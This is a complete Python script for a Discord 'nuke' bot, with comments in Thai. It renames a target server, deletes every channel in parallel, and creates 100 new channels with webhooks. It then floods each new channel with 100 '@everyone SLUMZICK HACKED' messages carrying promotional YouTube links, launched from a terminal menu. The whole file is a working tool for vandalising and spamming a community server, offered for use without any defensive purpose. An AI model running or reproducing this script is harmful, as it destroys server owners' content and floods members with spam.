import discord
from discord.ext import commands
import asyncio
import os
import random

PROMO_LINKS = [
    "https://youtu.be/uhk7RJGcU5I",
    "https://youtu.be/p1-73zXRlb8",
    "https://youtu.be/uETcV49IhpY",
    "https://youtu.be/pjyw52_9QqM",
    "https://youtu.be/qWW0-HZkJpQ"
]

def show_banner():
    os.system('clear')
    print("""
    #################################################
    #     S L U M Z I C K   H Y P E R - F L O O D    #
    #          [ NO DELAY - MAX SPEED ]             #
    #################################################
    """)

async def ainput(prompt: str = ""):
    return await asyncio.to_thread(input, prompt)

async def ultra_fast_spam(webhook_url):
    """ยิงข้อความเข้า Webhook แบบรัวไม่ยั้ง (Flood)"""
    async with discord.Webhook.from_url(webhook_url, session=bot.http._HTTPClient__session) as wh:
        # สร้างรายการงาน 100 ข้อความต่อ 1 ห้อง
        tasks = []
        for _ in range(100):
            link = random.choice(PROMO_LINKS)
            tasks.append(wh.send(f"@everyone 🔥 **SLUMZICK HACKED** 🔥\n{link}", username="SLUMZICK GOD"))
        
        # ยิงออกไปพร้อมกันทั้งหมดในห้องเดียว
        await asyncio.gather(*tasks, return_exceptions=True)

async def start_hyper_nuke(guild):
    show_banner()
    print("🚀 [SLUMZICK] กำลังยิงสแปมแบบปูพรม...")
    
    # 1. เปลี่ยนชื่อเซิร์ฟ
    try: await guild.edit(name="BY SLUMZICK GOD")
    except: pass

    # 2. ลบทุกห้อง (แบบขนาน)
    print("🗑️ ลบห้องเก่า...")
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)

    # 3. สร้างห้องและยัดสแปมทันที
    print("⚡ เริ่มสแปมความเร็วสูง...")
    
    async def create_and_flood():
        try:
            ch = await guild.create_text_channel(name="slumzick-god-mode")
            webhook = await ch.create_webhook(name="SLUMZICK")
            # ยิงสแปมทันทีที่ Webhook พร้อม
            asyncio.create_task(ultra_fast_spam(webhook.url))
        except: pass

    # รันการสร้างห้อง 100 ห้อง (Discord มักจำกัดที่ 500 ห้อง แต่ 100-200 จะเร็วที่สุด)
    for _ in range(100):
        asyncio.create_task(create_and_flood())
        # หน่วงเสี้ยววินาทีเพื่อไม่ให้ Connection หลุด
        await asyncio.sleep(0.005)

async def termux_menu(bot, g_id):
    await bot.wait_until_ready()
    guild = bot.get_guild(int(g_id))
    if not guild: os._exit(0)

    while True:
        show_banner()
        print(f" TARGET: {guild.name}")
        print("-" * 49)
        print("  [1] 🚀 HYPER FLOOD (สแปมรัวทุกห้อง - เร็วที่สุด)")
        print("  [2] ❌ EXIT")
        print("-" * 49)
        
        choice = await ainput("SLUMZICK > ")
        if choice == '1':
            await start_hyper_nuke(guild)
            print("\n[✅] คำสั่ง Flood ถูกส่งออกไปแล้ว!")
            await asyncio.sleep(5)
        elif choice == '2':
            await bot.close(); os._exit(0)

# --- SETUP ---
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    bot.loop.create_task(termux_menu(bot, GID))

show_banner()
TOKEN = input("TOKEN : ")
GID = input("SERVER ID : ")
bot.run(TOKEN)
